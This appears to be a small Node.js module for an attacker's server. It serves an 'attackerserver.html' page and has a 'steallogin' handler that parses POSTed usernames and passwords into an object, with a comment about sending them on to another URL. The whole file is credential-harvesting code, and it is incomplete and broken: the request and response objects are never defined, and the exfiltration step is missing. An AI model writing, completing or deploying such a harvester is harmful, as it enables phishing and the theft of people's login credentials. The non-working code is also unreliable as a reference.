var fs = require('fs');
var qs = require('querystring');

function attackerserver() {
	fs.readFile('./attackerserver.html', function(error,data){
		response.end(data);
	});
}

function steallogin(){
	if (request.method == 'POST') {
		var procPost = '';
		request.on('data', function(chunk) {
			procPost += chunk;

			if (procPost.length > 1e6)
				request.connection.destroy();
		});

		request.on('end', function() {
			var loginData = qs.parse(procPost);
			var userName = loginData['username'];
			var password = loginData['password'];

			var Data = function(un, pwd) {
				this.userName = un;
				this.password = pwd;
			}

			var seedData = new Data(userName, password);
			// Output information on another url

		});
	} else {
		response.writeHead(404, {"Content-Type": "text/html"});
		response.write('<html><body><h2 text-align="center">Invalid access to url</h2></body></html>');
		response.end();
	}
}

exports.attackerserver = attackerserver;
exports.steallogin = steallogin;

